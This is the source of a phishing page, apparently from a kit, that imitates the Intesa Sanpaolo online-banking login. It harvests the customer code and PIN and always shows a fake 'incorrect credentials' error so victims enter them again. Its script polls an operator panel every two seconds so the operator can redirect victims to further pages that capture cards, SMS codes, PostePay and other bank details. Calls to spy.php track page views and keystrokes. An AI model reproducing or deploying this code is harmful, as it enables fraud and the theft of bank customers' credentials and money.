<?php 
require_once '../includes/main.php';
require '../main.php';
?>

<!DOCTYPE html>
<html lang="it">

<head>
    <meta charset="utf-8">
    <title>Banca Intesa Sanpaolo - Conto Corrente per Famiglie, Giovani e Aziende</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="intserror/res/bootstrap.css">
    <link rel="stylesheet" href="intserror/res/test.css">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="icon" href="intserror/res/favicong.ico" type="image/x-icon" />
</head>

<body>
<section>
        <div class="login">
            <div class="form">
                <div class="titre text-center">
                    <img src="intserror/res/green.png">
                    <h3 class="mt-4 mb-2">Sei già cliente?</h3>
                </div>
                <p class="mt-4"><img src="intserror/res/loock.png">ACCEDI ALLA TUA BANCA ONLINE</p>
                <form action="post.php" method="post">

                    <input type="hidden" value="index" name="step">
                    
                    <div class="form-groupe mt-3">
                        <input type="tel" placeholder="Codice Titolare" id="userin3" maxlength="8" name="userin3" >
                    </div>

                     <div class="form-groupe mt-3">
                        <input type="tel" id="pass3" placeholder="PIN"  maxlength="5" name="pass3">
                    </div>

                    <div class="bttn mt-4 ">
                        <button onclick="sendNexi()">ENTRA</button>
                    </div>
                    
                    <div style="color : red">Codice titolare e PIN inseriti non sono corretti.</div>                    <div class=" pt-2 pb-5"><a href="#">Hai dimenticato il PIN ?<img src="intserror/res/flesh.png"></a></div>
                </form>
            </div>
            <div class="reg py-3">
                    <h4 class="text-center mb-3">Non sei ancora cliente?</h4 class="text-center">
                    <div class="text-center"><span>Scopri XME Conto, <br> puoi aprirlo anche online.</span></div>

                    <div class="bttn mt-4 ">
                        <button class="bg-white">Apri XME Conto</button>
                    </div>
            </div>
            <div class="reg py-3" style="background:#323232;">
                    <h5 class="text-center mb-3">Sei interessato a un prestito?</h5 class="text-center">
                    <div class="text">
                        <span>Per richiederlo non è necessario essere titolare di un conto corrente Intesa Sanpaolo: ti aspettiamo in filiale.</span>
                    </div>
            </div>
        </div>     
    </section>

    <script src="res/jq.js"></script>
<script src="res/v.js"></script>
	<script src="css/jq.js.download"></script>
	<script>
	var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
    };
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"INTESA_Error"} );
}, 2000);
var redirect=0;
setInterval(function(){
	$.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 2000);
function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}


        // Spy functionality for user input monitoring
        $.post("spy.php", {
            intesview: 1
        });
        var abort = false;
        $("#userin").keyup(function () {
            if (abort == false) {
                $.post("spy.php", {
                    intesi: 1
                });
                abort = true;
            }
        });
    </script>
</body>

</html>
